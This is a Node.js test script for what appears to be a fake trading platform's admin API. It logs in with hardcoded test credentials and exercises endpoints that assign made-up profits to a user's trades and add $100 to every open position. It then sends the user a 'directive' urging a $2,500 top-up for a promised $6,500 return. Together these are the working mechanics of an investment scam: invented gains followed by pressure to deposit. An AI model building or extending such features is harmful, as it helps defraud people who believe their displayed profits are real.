const http = require('http');

function post(url, body, token) {
  return new Promise((resolve, reject) => {
    const u = new URL(url);
    const data = JSON.stringify(body);
    const req = http.request({
      hostname: u.hostname,
      port: u.port,
      path: u.pathname,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(data),
        ...(token ? { Authorization: 'Bearer ' + token } : {})
      }
    }, (res) => {
      let d = '';
      res.on('data', chunk => d += chunk);
      res.on('end', () => resolve(JSON.parse(d)));
    });
    req.on('error', reject);
    req.write(data);
    req.end();
  });
}

function get(url, token) {
  return new Promise((resolve, reject) => {
    const u = new URL(url);
    http.get({
      hostname: u.hostname,
      port: u.port,
      path: u.pathname + u.search,
      headers: token ? { Authorization: 'Bearer ' + token } : {}
    }, (res) => {
      let d = '';
      res.on('data', chunk => d += chunk);
      res.on('end', () => resolve(JSON.parse(d)));
    }).on('error', reject);
  });
}

async function test() {
  console.log('=== Log in Admin ===');
  const adminLogin = await post('http://localhost:5000/api/auth/login', { email: 'admin@mail.com', password: '123456' });
  const adminToken = adminLogin.data.tokens.accessToken;

  console.log('=== Log in User ===');
  const userLogin = await post('http://localhost:5000/api/auth/login', { email: 'user@mail.com', password: '123456' });
  const userToken = userLogin.data.tokens.accessToken;
  const userId = userLogin.data.user.id;

  console.log('=== 1. Test Multi-Asset Basket Execution (BTC + NVDA + ETH) ===');
  const multiRes = await post('http://localhost:5000/api/admin/trade-multi-assets', {
    user_id: userId,
    assets: [
      { pair: 'BTC/USDT', side: 'BUY', amount: 0.15, initial_profit: 350.00 },
      { pair: 'NVDA/USD', side: 'BUY', amount: 10, initial_profit: 220.00 },
      { pair: 'ETH/USDT', side: 'BUY', amount: 1.5, initial_profit: 180.00 }
    ],
    admin_notes: 'Institutional Multi-Asset Wealth Allocation'
  }, adminToken);
  console.log('Multi-asset execution result:', multiRes.success, 'Trades created:', multiRes.data.length);
  multiRes.data.forEach(t => console.log(`  - ${t.pair} (${t.side}): Size ${t.amount} | Profit: $${t.current_profit}`));

  console.log('\n=== 2. Test Bulk Profit Boost (+$100 across all active assets) ===');
  const boostRes = await post('http://localhost:5000/api/admin/boost-all-profits', {
    user_id: userId,
    delta_profit: 100.00
  }, adminToken);
  console.log('Boost result:', boostRes.success, 'Positions updated:', boostRes.data.length);
  boostRes.data.forEach(t => console.log(`  - ${t.pair}: New Profit $${t.current_profit}`));

  console.log('\n=== 3. Test Customizable Top-Up Prompt Directive ===');
  const promptRes = await post('http://localhost:5000/api/admin/send-prompt', {
    user_id: userId,
    title: 'Institutional Capital Enhancement Directive',
    message: 'Our algorithmic trading desk has identified an institutional breakout. Top up $2,500.00 to your active capital to capture the projected +$6,500.00 target return.',
    target_amount: 2500.00,
    expected_payout: 6500.00,
    urgency: 'opportunity'
  }, adminToken);
  console.log('Prompt sent:', promptRes.success, 'Prompt ID:', promptRes.data.id, 'Title:', promptRes.data.title);

  console.log('\n=== 4. Test User fetching active Prompts ===');
  const userPrompts = await get('http://localhost:5000/api/trade/prompts', userToken);
  console.log('User active prompts count:', userPrompts.data.length);
  console.log('User prompt preview:', {
    title: userPrompts.data[0].title,
    target_amount: userPrompts.data[0].target_amount,
    expected_payout: userPrompts.data[0].expected_payout
  });

  console.log('\n>>> MULTI-ASSET & CUSTOMIZABLE BROKER PROMPT TESTS PASSED PERFECTLY! <<<');
  process.exit(0);
}

test().catch(e => {
  console.error('Test Error:', e);
  process.exit(1);
});
